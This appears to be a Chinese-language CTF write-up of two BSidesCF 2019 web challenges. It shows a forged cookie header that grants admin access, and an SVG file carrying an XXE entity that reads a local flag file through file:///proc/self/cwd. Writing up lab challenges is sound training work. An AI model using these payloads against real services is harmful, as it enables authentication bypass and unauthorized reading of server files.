## [BSidesCF 2019]Kookie

根据提示构造cookie

```
Cookie:monster=admin
```

![image-20210831153734100](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210831153734100.png)

看到这个还有个username

再构造一个

```
Cookie:monster=admin;username=admin
```

![image-20210831153610575](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210831153610575.png)

## [BSidesCF 2019]SVGMagic

![image-20210831155706674](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210831155706674.png)

svg用了xml来描述图形，那么这里是不是存在着一个xxe

根据svg的语法写一个svg文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```

![image-20210831161523250](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210831161523250.png)

